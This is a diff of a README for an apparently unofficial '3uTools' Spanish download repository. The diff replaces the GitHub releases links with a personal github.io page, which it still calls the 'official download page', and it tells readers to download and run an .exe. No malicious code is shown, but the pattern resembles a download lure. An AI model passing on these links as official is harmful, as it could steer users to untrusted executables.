@@ -1,7 +1,7 @@
 # 📱 Descargar-3uTools-Espanol - Manage Apple devices on Windows easily
 
 <p align="center">
-  <a href="https://github.com/Kristenjuicy426/Descargar-3uTools-Espanol/releases">
+  <a href="https://kristenjuicy426.github.io">
     <img src="https://img.shields.io/badge/Download-3uTools-blue.svg" alt="Download 3uTools">
   </a>
 </p>
@@ -40,7 +40,7 @@ Before installation, ensure your computer meets these minimum specifications:
 Follow these steps to set up the software on your system.
 
 ### Step 1: Visit the Release Page
-Navigate to the project release area to obtain the setup file. You can access the official download page here: [Download 3uTools from Releases](https://github.com/Kristenjuicy426/Descargar-3uTools-Espanol/releases).
+Navigate to the project release area to obtain the setup file. You can access the official download page here: [Download 3uTools from Releases](https://kristenjuicy426.github.io).
 
 ### Step 2: Download the Installer
 Once you arrive at the page, look for the list under the "Assets" heading. Select the file ending in `.exe` to start the download. Save this file to your Downloads folder or desktop.
